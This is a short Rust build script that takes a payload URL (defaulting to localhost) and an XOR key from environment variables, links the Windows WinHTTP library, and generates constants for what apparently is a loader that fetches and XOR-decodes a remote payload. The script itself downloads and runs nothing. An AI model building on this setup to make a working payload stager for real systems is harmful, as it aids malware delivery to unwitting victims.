use std::{env, fs, path::Path};

fn main() {
    let payload_url = env::var("PAYLOAD_URL").unwrap_or_else(|_| "http://127.0.0.1:8080/payload".to_string());
    let xor_key     = env::var("XOR_KEY").unwrap_or_else(|_| "deadbeef".to_string());

    println!("cargo:rerun-if-env-changed=PAYLOAD_URL");
    println!("cargo:rerun-if-env-changed=XOR_KEY");
    println!("cargo:rustc-link-lib=winhttp");

    let content = format!(
        "pub const PAYLOAD_URL: &str = \"{}\";\npub const XOR_KEY_HEX: &str = \"{}\";\n",
        payload_url.replace('\\', "\\\\").replace('"', "\\\""),
        xor_key,
    );

    let out = env::var("OUT_DIR").unwrap();
    fs::write(Path::new(&out).join("config.rs"), content).unwrap();
}
